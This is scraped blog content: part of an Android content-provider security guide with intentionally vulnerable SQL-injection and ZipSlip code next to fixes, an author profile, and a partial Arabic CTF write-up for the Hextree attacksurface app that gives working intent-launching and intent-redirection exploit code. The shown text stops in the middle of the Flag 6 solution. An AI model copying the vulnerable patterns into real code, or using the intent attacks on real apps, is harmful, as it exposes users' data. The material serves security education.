DatabaseHelper(getContext()); return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Vulnerable: Uses raw SQL with untrusted input SQLiteDatabase db = dbHelper.getReadableDatabase(); return db.rawQuery(\u0026#34;SELECT * FROM table WHERE \u0026#34; + selection, selectionArgs); } // Other required methods omitted for brevity } Mitigation # // SECURE: Use separate databases for different security levels public class SecureProvider extends ContentProvider { private SQLiteDatabase mSecureDb; @Override public boolean onCreate() { SQLiteOpenHelper helper = new MySecureDbHelper(getContext(), \u0026#34;secure.db\u0026#34;); mSecureDb = helper.getWritableDatabase(); return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Use parameterized queries SQLiteQueryBuilder builder = new SQLiteQueryBuilder(); builder.setStrict(true); builder.setStrictColumns(true); builder.setStrictGrammar(true); return builder.query(mSecureDb, projection, selection, selectionArgs, null, null, sortOrder); } } 10. Zip Path Traversal (ZipSlip) # Vulnerability # When an Android app extracts files from compressed archives (like ZIP files), if the extraction logic doesn\u0026rsquo;t validate the filenames within the archive for directory traversal characters (../), it can be vulnerable.\nAttack # An attacker crafts a malicious ZIP file where entries have filenames like ../../../../data/data/com.victim/files/sensitive.txt. When the vulnerable app unpacks this archive, it could write arbitrary files to locations outside the intended destination directory, potentially overwriting application configuration files, databases, or even native libraries, leading to code execution.\nVulnerable Code Example # public class ZipExtractor { public void extractZip(File zipFile, File outputDir) throws IOException { ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile)); ZipEntry entry; while ((entry = zis.getNextEntry()) != null) { // Vulnerable: No validation of entry name String entryName = entry.getName(); File outputFile = new File(outputDir, entryName); OutputStream os = new FileOutputStream(outputFile); byte[] buffer = new byte[1024]; int len; while ((len = zis.read(buffer)) != -1) { os.write(buffer, 0, len); } os.close(); zis.closeEntry(); } zis.close(); } } Mitigation # Verify target path is a child of destination directory: Before extracting each entry from a ZIP archive, always verify that the target path is a child of the intended destination directory by comparing their canonical paths Ensure destination directory is empty: To prevent accidentally overwriting existing files, make sure the extraction destination directory is empty before starting the extraction process Security \u0026amp; Best Practices # Permission Strategy # [!IMPORTANT] Principle of Least Privilege Only request necessary permissions and avoid being \u0026ldquo;overzealous\u0026rdquo;. Users implicitly grant requested permissions during installation.\nRestrict Access Through Permissions # \u0026lt;!-- Example secure provider configuration --\u0026gt; \u0026lt;provider android:name=\u0026#34;.SecureProvider\u0026#34; android:authorities=\u0026#34;com.example.secure.provider\u0026#34; android:exported=\u0026#34;true\u0026#34; android:readPermission=\u0026#34;com.example.permission.READ_DATA\u0026#34; android:writePermission=\u0026#34;com.example.permission.WRITE_DATA\u0026#34;\u0026gt; \u0026lt;!-- Extra protection for sensitive paths --\u0026gt; \u0026lt;path-permission android:path=\u0026#34;/admin/*\u0026#34; android:readPermission=\u0026#34;com.example.permission.ADMIN_READ\u0026#34; android:writePermission=\u0026#34;com.example.permission.ADMIN_WRITE\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- Define custom permissions --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.permission.READ_DATA\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; Secure Data Storage # [!WARNING] Keep Data Private Store data in internal files, SQLite databases, or cloud and keep these private to your application.\nAvoid world-readable/writable: Don\u0026rsquo;t set internal files or SQLite databases to world-readable/writable SQLite databases are private by default This prevents permissions bypass Prevent SQL Injection # [!DANGER] SQL Injection Prevention Always sanitize user input when querying, inserting, updating, or deleting data.\nRecommended approach:\n// SECURE: Use selection with replaceable parameters String selection = \u0026#34;column = ?\u0026#34;; String[] selectionArgs = {\u0026#34;user_input\u0026#34;}; Cursor cursor = resolver.query(uri, projection, selection, selectionArgs, sortOrder); // INSECURE: Direct string concatenation String selection = \u0026#34;column = \u0026#39;\u0026#34; + userInput + \u0026#34;\u0026#39;\u0026#34;; // DON\u0026#39;T DO THIS! Additional protections:\nUse PreparedStatement objects Use Android\u0026rsquo;s built-in query() methods Configure SQLiteQueryBuilder with setStrict(), setStrictColumns(), setStrictGrammar() Consider Room Persistence Library for compile-time SQL verification Implementation Best Practices # Thread Safety # [!NOTE] Thread Safety All ContentProvider methods except onCreate() can be called by multiple threads simultaneously - implementations must be thread-safe.\nEfficient onCreate() # @Override public boolean onCreate() { // Only fast-running initialization here // Defer heavy tasks like database creation until needed // This prevents slowing down provider startup return true; } Contract Classes # // Define constants in public final contract class public final class MyContract { public static final String AUTHORITY = \u0026#34;com.example.provider\u0026#34;; public static final Uri BASE_URI = Uri.parse(\u0026#34;content://\u0026#34; + AUTHORITY); // Table contracts public static final class Users implements BaseColumns { public static final Uri URI = Uri.withAppendedPath(BASE_URI, \u0026#34;users\u0026#34;); public static final String TABLE_NAME = \u0026#34;users\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; public static final String COLUMN_EMAIL = \u0026#34;email\u0026#34;; } } In The end # [!TIP] Key Takeaways\nPrinciple of Least Privilege - Only grant necessary permissions Defense in Depth - Multiple security layers (export, permissions, validation) Simplicity - Keep providers focused on data access only Validation - Always validate and sanitize input Separation - Isolate different security levels Resources # Documentation # Android Content Providers Guide Content Provider Security FileProvider Documentation Security Resources # OWASP Mobile Security Testing Guide - Content Providers drozer - Android Security Assessment Framework Best Practices # Android Security Tips Secure Coding Guidelines ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/providers/","section":"","summary":"","title":"Content \u0026 File Providers","type":"posts"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/contnet-provider/","section":"Tags","summary":"","title":"Contnet Provider","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/deep-link/","section":"Tags","summary":"","title":"Deep Link","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/tags/deep-links/","section":"Tags","summary":"","title":"Deep Links","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/file-provider/","section":"Tags","summary":"","title":"File Provider","type":"tags"},{"content":" About Me # üëã Hey there, I\u0026rsquo;m Saeed khalid your friendly neighborhood cybersecurity explorer.\nI\u0026rsquo;m a 3rd year computer Engineering student @shoubra , and self-taught enthusiast with a intrest in breaking down systems and brainstorm solutions. My journey so far is a mix betwen red team \u0026amp; blue team with focus now on android and networking\nüîê My Cybersecurity Journey # I‚Äôm obsessed with securing the digital world while mastering the art of ethical hacking. My focus spans:\nüõ°Ô∏è Red: I dive deep into web app vulnerabilities, Android app weaknesses, and network exploitation. üîç Reverse Engineering: I used Jadx, Ghidra, and Binary Ninja to unravel Android APKs, analyzing bytecode and runtime behaviors to uncover risks. üß™ Security Education: I lead workshops in msp team helping other with what i learned. üß∞ CTF \u0026amp; Labs: Iam trying to craft vulnerable PHP web apps for hands-on practice, covering SQLi, XSS, IDOR, and more, to sharpen my skills and teach others. üíº Internships # Network Security Intern ‚Äì National Telecommunication Institute (NTI) | 120 hours\nDeveloped real-world soft skills through interactive learning and projects. Created projects to deepen understanding of network security concepts. Cyber Security Intern ‚Äì Amideast | 180 hours\nCompleted Google Career Certificate in Cybersecurity via Coursera scholarship. Gained hands-on experience in both defensive and offensive security. üìú Certifications # Google Cybersecurity Certificate | Google Career Certificates ‚Äì 180H Android | Hextree ‚Äì 6.5H Learn Android Application Development | Udemy ‚Äì 27H Android App Hacking ‚Äì Black Belt Edition | Udemy ‚Äì 55H üì± Beyond cybersecurity # i like creating stuf when ever i can\nüíæ Embedded Systems: I played with PIC16F877A microcontrollers, writing firmware to program a trafic light ü§ñ Android Development: üéÆ Projects # Here‚Äôs some of my creations that saw light:\nüß† MIPS Assembly Centipede: Built a retro-style Centipede game in MIPS assembly using MARS, complete with collision detection, blaster mechanics, and entity logic.\nüõ∞Ô∏è A Pathfinding in MIPS*: Developed a pathfinding algorithm with a binary min-heap priority queue, proving efficiency in low-level programming.\nüåê Cybersecurity Blog: Running a Hugo-powered blog with the Blowfish theme, documenting my journey with Arabic support, dynamic Firebase features (likes, comments, views), and a sleek, moving background.\nüèÜ Awards \u0026amp; Achievements # Ranked in the Top 10% on TryHackMe | Sept 2024 üß† Always Evolving # I‚Äôm constantly sharpening my skills and chasing new challenges:\nüèÜ Certifications in Progress: Studying for eJPT and OSCP to solidify my expertise in penetration testing. üìö Deep Dives: Obsessed with Android Runtime (ART), mobile app hardening, secure coding, and bug bounty methodologies. üõ†Ô∏è Tools \u0026amp; Techniques: Staying current with tools like Frida, Wireshark, and OWASP ZAP, and exploring advanced topics like kernel exploits and cloud security. üì∏ Life Beyond the Terminal # When I‚Äôm not battling bugs or writing code, I‚Äôm out exploring the world:\nüèÉ Sunrise Runs: Chasing the perfect orange sky with my camera, capturing nature‚Äôs beauty. üìñ reader: reaading novels like 1984 and others. üé® Creative Coding: Experimenting with animations and dynamic web features to bring my blog to life. ü§ù Let‚Äôs Hack the Future Together # I‚Äôm always up for collaborating on cybersecurity research, bug bounties, or innovative projects. Whether you‚Äôre into hacking, defending, or building cool tech, let‚Äôs connect and make the digital world a safer (and more exciting) place.\nüßë‚Äçüíª ‚ÄúIn a world of ones and zeros, I chase the greys.‚Äù\nüì´ Get in Touch # Email: happyk1309@gmail.com GitHub: github.com/happy-joyboy LinkedIn: linkedin.com/in/saeed-khalid-awaad Blog: Explore my cybersecurity journey on my blog! ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/about/","section":"JoyBoy","summary":"wfwef","title":"First","type":"page"},{"content":" something new # May this be the end And start of something new\nMin\u0026rsquo;na, N arigato gozaimasu\n","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/first/","section":"","summary":"?","title":"First","type":"posts"},{"content":" Flag 1 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public class Flag1Activity extends AppCompactActivity { public Flag1Activity() { this.name = \u0026#34;Flag 1 - Basic exported activity\u0026#34;; this.flag = \u0026#34;zABitOReWutKdkrMKx2NPVXklOmLz1SB85u2kJjUe1ojI9LMWkbEKkjANz15WHmb\u0026#34;; } protected void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); this.f.addTag(\u0026#34;basic-main-activity-avd2\u0026#34;); success(this); } ŸÑŸÖÿß ÿßŸÑŸÄ activity ÿØŸä ÿ®ÿ™ÿ≥ÿ™ÿØÿπÿß ÿå ÿßŸÑŸÄ constructor ŸáŸäÿ≠ÿ∑ ÿßÿ≥ŸÖ ÿßŸÑŸÄ activity \u0026ldquo;Flag 1 - Basic exported activity\u0026rdquo; ŸàŸäÿπÿ±ŸëŸÅ ŸÖÿ™ÿ∫Ÿäÿ± ÿßŸÑŸÄ flag. ÿßŸÑŸÄ LogHelper ÿØŸá ÿ®Ÿäÿ≥ÿ™ÿÆÿØŸÖ ÿπÿ¥ÿßŸÜ Ÿäÿ∂ŸäŸÅ tag ÿßÿ≥ŸÖŸá \u0026ldquo;basic-main-activity-avd2\u0026rdquo; Ÿàÿ®ÿπÿØŸäŸÜ method success ÿ®ÿ™ÿ™ŸÜÿßÿØŸâ.\nÿßŸÑÿ≠ŸÑ # ŸäÿπŸÜŸä ÿ®ÿ≥ ÿ®ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑŸÄ activity ÿØŸä ÿßŸÑŸÄ method Ÿáÿ™ÿ¥ÿ™ÿ∫ŸÑ ŸàÿØŸá ŸÖŸÖŸÉŸÜ Ÿäÿ≠ÿµŸÑ ÿ®ŸÄ Explicit intent. ŸÖŸÜ ÿßŸÑŸÉŸàÿØ ŸÜŸÑÿßŸÇŸä:\npackage= \u0026ldquo;io.hextree.attacksurface\u0026rdquo; class name : io.hextree.attacksurface.activities.Flag1Activity Java:\nIntent EvilIntent = new Intent(); EvilIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag1Activity\u0026#34; )); startActivity(EvilIntent); ADB:\nadb shell am start-activity io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity Flag 2 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag2Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; ŸáŸÜÿß ÿßŸÑŸÄ Filter ÿ®ŸäŸàÿ∂ÿ≠ ÿ•ŸÜ ÿßŸÑŸÄ Activity ÿØŸá ÿ®Ÿäÿ≥ŸÖÿπ ŸÑŸÄ action string: io.hextree.action.GIVE_FLAG Ÿà ŸÉÿØŸá ŸáŸäŸÇÿØÿ± Ÿäÿ≥ÿ™ŸÇÿ®ŸÑ intent ÿßŸÑÿπŸÜÿØŸá ÿßŸÑŸÄ action ÿØŸá\nprotected void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); String action = getIntent().getAction(); if (action == null || !action.equals(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;)) { return; } this.f.addTag(action); success(this); } ÿßŸÑŸÄ Intent ÿ®Ÿäÿ™ÿ≥ÿ™ŸÇÿ®ŸÑ ÿ®ÿßŸÑŸÄ getIntent() ŸàÿßŸÑŸÄ action ÿ®Ÿäÿ™ŸÇÿ±ÿß ÿ® getAction() Ÿàÿ®ÿπÿØŸäŸÜ Ÿäÿ™ÿ≠ŸÅÿ∏ ŸÅŸä string actionÿå ÿ´ŸÖ Ÿäÿ™ÿ¥ŸäŸÉ ŸÑŸà null (ŸÅÿßÿ∂Ÿä) ÿ£Ÿà ŸÖÿÆÿ™ŸÑŸÅ ÿπŸÜ ÿßŸÑŸÄ flag. ŸÑŸà ŸÉŸÑŸá ÿ™ŸÖÿßŸÖ Ÿàÿ≥ŸÑŸäŸÖÿå success() ÿ®ÿ™ÿ™ŸÜÿßÿØŸâ.\nÿßŸÑÿ≠ŸÑ # ŸÜÿ≠ÿ∑ ÿßŸÑŸÄ flag Ÿà ŸÜÿ≠ÿ∑ ÿßŸÑŸÄ Package ŸàÿßŸÑŸÄ activity name ÿßŸÑÿµÿ≠\nIntent EvilIntent = new Intent(); EvilIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag2Activity\u0026#34; )); EvilIntent.setAction(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;); startActivity(EvilIntent); Flag 3 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag3Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; ŸáŸÜÿß ÿßŸÑŸÄ filter ÿ®Ÿäÿ¥ŸäŸÉ ÿπŸÑŸâ ÿ≠ÿßÿ¨ÿ™ŸäŸÜ:\naction name specific data / content -\u0026gt; url ÿßŸÑŸÑŸä ŸáŸà https protocol Intent intent = getIntent(); String action = intent.getAction(); if (action == null || !action.equals(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;)) { return; } this.f.addTag(action); Uri data = intent.getData(); if (data == null || !data.toString().equals(\u0026#34;https://app.hextree.io/map/android\u0026#34;)) { return; } this.f.addTag(data); success(this); ŸáŸäÿ™ÿ≥ÿ™ŸÇÿ®ŸÑ intent ŸàÿßŸÑŸÄ action ÿ®ÿ™ÿ™ÿ¥ŸäŸÉ Ÿàÿ®ÿπÿØŸäŸÜ ÿßŸÑŸÄ data ÿ®ÿ™ÿ™ÿ≠ŸÅÿ∏ ŸÅŸä ŸÖÿ™ÿ∫Ÿäÿ± ŸÜŸàÿπ Uri Ÿàÿ®ÿπÿØŸäŸÜ ÿ™ÿ™ÿ¥ŸäŸÉ ÿ®ÿπÿØ ŸÖÿß ÿ™ÿ™ÿ≠ŸàŸÑ ŸÑŸÄ string ŸàŸÑŸà ÿ≤Ÿä ÿ®ÿπÿ∂ÿå ÿßŸÑŸÄ condition ŸáŸäÿ™ÿÆÿ∑Ÿâ Ÿàsuccess Ÿáÿ™ÿ™ŸÜÿßÿØŸâ.\nÿßŸÑÿ≠ŸÑ # ŸÖŸÜ ÿ™ÿ≠ŸÑŸäŸÑŸÜÿß:\npackage= \u0026ldquo;io.hextree.attacksurface\u0026rdquo; Intent action: \u0026quot;io.hextree.action.GIVE_FLAG\u0026quot; data : \u0026ldquo;https://app.hextree.io/map/android\" class name : io.hextree.attacksurface.activities.Flag3Activity Intent EvilIntent = new Intent(); EvilIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag3Activity\u0026#34; )); EvilIntent.setAction(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;); EvilIntent.setData(Uri.parse(\u0026#34;https://app.hextree.io/map/android\u0026#34;)); startActivity(EvilIntent); Flag 4 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); stateMachine(getIntent()); } ÿßŸÑŸÄ constructor ÿ®ŸäŸÜÿßÿØŸâ ÿπŸÑŸâ onCreate() ŸàÿßŸÑŸÄ starMachine() ÿ®ÿ™ÿ™ŸÜÿßÿØŸâ ŸàÿßŸÑŸÄ intent ÿßŸÑŸÖÿ≥ÿ™ŸÇÿ®ŸÑ ÿ®Ÿäÿ™ÿ®ÿπÿ™ ŸÑŸäŸáÿß\npublic void stateMachine(Intent intent) { String action = intent.getAction(); int ordinal = getCurrentState().ordinal(); if (ordinal != 0) { if (ordinal != 1) { if (ordinal != 2) { if (ordinal == 3) { this.f.addTag(State.GET_FLAG); setCurrentState(State.INIT); success(this); return; } if (ordinal == 4 \u0026amp;\u0026amp; \u0026#34;INIT_ACTION\u0026#34;.equals(action)) { setCurrentState(State.INIT); Toast.makeText(this, \u0026#34;Transitioned from REVERT to INIT\u0026#34;, 0).show(); return; } } else if (\u0026#34;GET_FLAG_ACTION\u0026#34;.equals(action)) { setCurrentState(State.GET_FLAG); Toast.makeText(this, \u0026#34;Transitioned from BUILD to GET_FLAG\u0026#34;, 0).show(); return; } } else if (\u0026#34;BUILD_ACTION\u0026#34;.equals(action)) { setCurrentState(State.BUILD); Toast.makeText(this, \u0026#34;Transitioned from PREPARE to BUILD\u0026#34;, 0).show(); return; } } else if (\u0026#34;PREPARE_ACTION\u0026#34;.equals(action)) { setCurrentState(State.PREPARE); Toast.makeText(this, \u0026#34;Transitioned from INIT to PREPARE\u0026#34;, 0).show(); return; } Toast.makeText(this, \u0026#34;Unknown state. Transitioned to INIT\u0026#34;, 0).show(); setCurrentState(State.INIT); } ÿßŸÑŸÄ activity ÿØŸá ÿ®Ÿäÿ∑ÿ®ŸÇ \u0026ldquo;state machine\u0026rdquo; ÿßŸÑŸÑŸä ÿ®ŸäŸÅÿ™ŸÉÿ± ÿ≠ÿßŸÑÿ™Ÿá ÿπÿ®ÿ± ÿßŸÑÿßÿ≥ÿ™ÿØÿπÿßÿ°ÿßÿ™ (ÿßÿ≥ÿ™ÿØÿπÿßÿ° activity)ÿå ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ SolvedPreferences. ÿ≠ÿ≥ÿ® ÿßŸÑÿ≠ÿßŸÑÿ© ÿßŸÑÿ≠ÿßŸÑŸäÿ© ŸàÿßŸÑŸÄ action ŸÑŸÑŸÄ Intent ÿßŸÑÿ¨ÿßŸäÿå ÿ®ŸäŸÜÿ™ŸÇŸÑ ŸÑŸÑÿ≠ÿßŸÑÿ© ÿßŸÑŸÑŸä ÿ®ÿπÿØŸáÿß ÿ£Ÿà ŸäÿπŸäÿØ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿπŸÖŸÑŸäÿ©. ÿ®ÿ≥ ŸÑŸà ÿ™ÿπÿØŸä ŸÉŸÑ ÿßŸÑÿ≠ÿßŸÑÿßÿ™ ÿµÿ≠ ÿ®ÿßŸÑÿ™ÿ±ÿ™Ÿäÿ® (INIT ‚ûî PREPARE ‚ûî BUILD ‚ûî GET_FLAG)ÿå ŸáŸäÿØŸäŸÉ ÿßŸÑŸÄ flag ÿßŸÑÿ≠ŸÑ # ÿ∑Ÿäÿ® ÿßŸÑŸÖŸÅÿ±Ÿàÿ∂ ŸÜÿ®ÿπÿ™ŸáŸÖ ÿ®ÿßŸÑÿ™ÿ±ÿ™Ÿäÿ® ÿØŸáÿü ÿ¨ÿ±ÿ®ÿ™ ŸàŸÅÿ¥ŸÑÿå ŸÑŸäŸáÿü ÿØŸá ŸÑÿ£ŸÜ ŸÑŸÖÿß ÿ™ÿ®ÿπÿ™ŸáŸÖ ÿ®ÿßŸÑÿ™ÿ±ÿ™Ÿäÿ® ÿßŸÑÿ™ÿµÿßÿπÿØŸäÿå ÿ¢ÿÆÿ± intent ŸáŸäŸÉŸàŸÜ ÿ£ŸàŸÑ ÿ≠ÿßÿ¨ÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ Ÿäÿ™ÿπÿßŸÖŸÑ ŸÖÿπÿßŸáÿß ŸÅŸáŸäÿ®ÿØÿ£ ŸÖŸÜ ÿßŸÑÿ¢ÿÆÿ± (ÿ™ÿ±ÿ™Ÿäÿ® ÿπŸÉÿ≥Ÿä).\nÿØŸá ŸÖÿß Ÿäÿπÿ±ŸÅ ÿ® activity back stack ŸÅŸä ÿßŸÑÿ£ŸÜÿØÿ±ŸàŸäÿØ ÿßŸà Last-In-First-Out (LIFO) (ÿßŸÑÿßÿÆŸäÿ± ŸáŸà ÿßŸÑÿßŸàŸÑ ŸÅŸä ÿßŸÑÿ∏ŸáŸàÿ±) ŸÅ ÿ≠ŸÑ ÿ®ÿ≥Ÿäÿ∑ ŸäŸÉŸàŸÜ ÿ•ŸÜŸÉ ÿ™ÿ®ÿπÿ™ intents ÿ®ÿ™ÿ±ÿ™Ÿäÿ® ÿπŸÉÿ≥Ÿä ŸÖŸÜ ÿßŸÑÿ£ŸàŸÑ\nIntent TheKey = new Intent(); TheKey.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); startActivity(TheKey); Intent getFlagIntent = new Intent(); getFlagIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag4Activity\u0026#34;)); getFlagIntent.setAction(\u0026#34;GET_FLAG_ACTION\u0026#34;); startActivity(getFlagIntent); Intent buildIntent = new Intent(); buildIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag4Activity\u0026#34;)); buildIntent.setAction(\u0026#34;BUILD_ACTION\u0026#34;); startActivity(buildIntent); Intent prepareIntent = new Intent(); prepareIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag4Activity\u0026#34;)); prepareIntent.setAction(\u0026#34;PREPARE_ACTION\u0026#34;); startActivity(prepareIntent); Flag 5 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onCreate(Bundle bundle) { Intent intent = getIntent(); Intent intent2 = (Intent) intent.getParcelableExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;); if (intent2 == null || intent2.getIntExtra(\u0026#34;return\u0026#34;, -1) != 42) { return; } this.f.addTag(42); Intent intent3 = (Intent) intent2.getParcelableExtra(\u0026#34;nextIntent\u0026#34;); this.nextIntent = intent3; if (intent3 == null || intent3.getStringExtra(\u0026#34;reason\u0026#34;) == null) { return; } this.f.addTag(\u0026#34;nextIntent\u0026#34;); if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;back\u0026#34;)) { this.f.addTag(this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;)); success(this); } else if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;next\u0026#34;)) { intent.replaceExtras(new Bundle()); startActivity(this.nextIntent); } } ŸáŸÜÿß ÿßŸÑŸÉŸàÿØ ÿ®Ÿäÿ≠ÿßŸàŸÑ ŸäÿßÿÆÿØ data ŸÖŸÜ intent ÿßŸÑŸÑŸä ŸÅŸäŸá intent ÿ™ÿßŸÜŸä ŸÉŸÄ extra data ŸÑŸÖÿß ÿßŸÑŸÄ intent Ÿäÿ™ŸÅŸÉÿå ÿßŸÑŸÄ activity ŸáŸäÿ¥ÿ∫ŸÑŸá ŸÑŸÜÿß ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ startActivity()\nintent2 ŸÑÿßÿ≤ŸÖ ŸäŸÉŸàŸÜ ŸÅŸäŸá int extra \u0026quot;return\u0026quot; ÿ®ŸÇŸäŸÖÿ© 42. intent2 ŸÑÿßÿ≤ŸÖ ŸäŸÉŸàŸÜ ŸÅŸäŸá nested parcelable intent ÿ™ÿ≠ÿ™ \u0026quot;nextIntent\u0026quot;. nextIntent ŸÑÿßÿ≤ŸÖ ŸäŸÉŸàŸÜ ŸÅŸäŸá string extra \u0026quot;reason\u0026quot; ÿ®ŸÇŸäŸÖÿ© \u0026quot;back\u0026quot;. intet -\u0026gt; intent2(\u0026quot;return\u0026quot;,42) -\u0026gt; intent3(\u0026quot;reason\u0026quot;, \u0026quot;back)\nÿßŸÑÿ≠ŸÑ # Intent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;back\u0026#34;); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); startActivity(intent); Flag 6 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onCreate(Bundle bundle) { if ((getIntent().getFlags() \u0026amp; 1) != 0) { this.f.addTag(\u0026#34;FLAG_GRANT_READ_URI_PERMISSION\u0026#34;); success(this); } } ÿ®ÿ≥Ÿäÿ∑ÿå ÿ®ÿ≥ ŸÜÿ®ÿπÿ™ intent ŸÖÿπ FLAG_GRANT_READ_URI_PERMISSION\u0026quot; flag \u0026hellip;. ÿµÿ≠ÿü\n\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag6Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; ÿ®ÿ≥ ŸÖŸÜ ÿßŸÑŸÄ xml ÿßŸÑŸÄ activity ŸÖÿ¥ exported ŸäÿπŸÜŸä ŸÖŸÜŸÇÿØÿ±ÿ¥ ŸÜÿ®ÿπÿ™ ŸÖÿ®ÿßÿ¥ÿ±ÿ©\nŸäÿπŸÜŸä ÿπÿßŸäÿ≤ŸäŸÜ ÿ≠ÿßÿ¨ÿ© ŸÅŸäŸáÿß startActivity() ŸàŸÜŸÇÿØÿ± ŸÜŸÜÿßÿØŸäŸáÿß ÿπÿ¥ÿßŸÜ ŸÑŸÖÿß ŸÜÿØŸäŸáÿß intent ÿ™ÿ±Ÿàÿ≠ ŸÖŸÜ \u0026ldquo;Activity A\u0026rdquo; ŸÑ \u0026ldquo;Activity B\u0026rdquo; ÿßŸÑ ŸÖkŸÇÿØÿ±ÿ¥ ŸÜŸÜÿßÿØŸäŸá ŸÖÿ®ÿßÿ¥ÿ±ÿ©\nActivity 5 ŸÅŸäŸá ÿßŸÑŸÖÿ∑ŸÑŸàÿ® ÿØŸá\nif (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;back\u0026#34;)) { this.f.addTag(this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;)); success(this); } else if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;next\u0026#34;)) { intent.replaceExtras(new Bundle()); startActivity(this.nextIntent); } ÿßŸÑÿ≠ŸÑ # ŸáŸÜÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿ≠ŸÑ ÿßŸÑŸÑŸä ŸÅÿßÿ™ ÿ®ÿ≥ ŸÜÿ∫Ÿäÿ± ÿßŸÑŸÄ extra text ŸÅŸä intent3 ŸÖŸÜ back 